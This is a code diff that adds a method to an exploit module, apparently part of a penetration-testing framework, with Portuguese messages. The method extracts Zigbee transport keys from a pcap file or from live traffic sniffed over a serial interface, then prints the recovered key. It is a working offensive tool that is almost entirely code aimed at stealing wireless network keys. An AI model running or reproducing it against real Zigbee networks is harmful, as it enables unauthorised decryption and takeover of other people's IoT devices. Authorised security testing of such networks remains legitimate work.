@@ -330,3 +330,47 @@ class Exploit(Exploit):
         handler = dispatch.get(mode)
         if handler:
             handler()
+        self._exploit()
+
+    def _exploit(self) -> None:
+        """E2E exploit: extract Zigbee keys via pcap analysis or live sniffing."""
+        mode = str(self.mode).strip().lower()
+        iface = str(getattr(self, "interface", "")).strip()
+
+        if mode == "extract" and str(self.pcap_file).strip():
+            pcap_data = self._load_pcap()
+            if pcap_data is not None:
+                raw = bytes(pcap_data) if not isinstance(pcap_data, bytes) else pcap_data
+                key = self._search_transport_key_in_raw(raw)
+                if key:
+                    print_success(f"Transport Key extraida do pcap: {key.hex()}")
+                    return
+            print_warning("Nenhuma chave encontrada no pcap fornecido")
+            return
+
+        if not iface:
+            print_warning("Sem interface configurada: skip captura ao vivo")
+            return
+
+        import serial
+        try:
+            ser = serial.Serial(iface, 115200, timeout=2)
+        except Exception as exc:
+            print_error(f"Falha ao abrir serial {iface}: {exc}")
+            return
+
+        print_status("Capturando tráfego Zigbee ao vivo por 30s...")
+        captured = b""
+        deadline = time.time() + 30
+        while time.time() < deadline:
+            chunk = ser.read(512)
+            if chunk:
+                captured += chunk
+
+        ser.close()
+        if captured:
+            key = self._search_transport_key_in_raw(captured)
+            if key:
+                print_success(f"Transport Key capturada ao vivo: {key.hex()}")
+            else:
+                print_info(f"Capturados {len(captured)} bytes, nenhuma chave encontrada")
